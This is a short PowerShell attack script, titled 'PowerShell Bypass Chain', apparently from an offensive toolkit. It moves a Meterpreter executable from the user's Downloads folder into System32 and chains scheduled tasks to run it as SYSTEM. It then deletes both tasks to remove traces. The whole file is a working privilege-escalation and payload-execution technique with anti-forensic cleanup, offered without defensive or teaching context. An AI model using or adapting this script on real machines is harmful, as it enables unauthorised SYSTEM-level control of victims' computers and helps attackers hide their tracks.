<#
 ┓      ┓       ┓  ┓   
┏┫┏┓┓┏┏┓┃┏┓┏┓┏┓┏┫  ┣┓┓┏
┗┻┗ ┗┛┗ ┗┗┛┣┛┗ ┗┻  ┗┛┗┫
           ┛          ┛
┳┓┏┓┓┏┏┓┏┓┓┏┓          
┃┃ ┫┣┫┣┫┃ ┃┫           
┻┛┗┛┛┗┛┗┗┛┛┗┛          
#>

# PowerShell Bypass Chain
$payloadSource = "$env:USERPROFILE\Downloads\meterpreter.exe"
$payloadDest = "C:\Windows\System32\payload.exe"
$task1 = "MovePayloadTask"
$task2 = "SystemPayload"

# Step 1: Move payload using Task 1
$action1 = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c move `"$payloadSource`" `"$payloadDest`" && schtasks /Create /RU SYSTEM /SC ONCE /TN $task2 /TR `"cmd.exe /c $payloadDest && schtasks /Delete /TN $task1 /F && schtasks /Delete /TN $task2 /F`" /ST $(Get-Date).AddMinutes(2).ToString('HH:mm')"
$trigger1 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
Register-ScheduledTask -Action $action1 -Trigger $trigger1 -TaskName $task1 -Description "Moves payload and sets SYSTEM task"
Write-Host "[+] Task '$task1' created. Wait 1-2 minutes for execution."
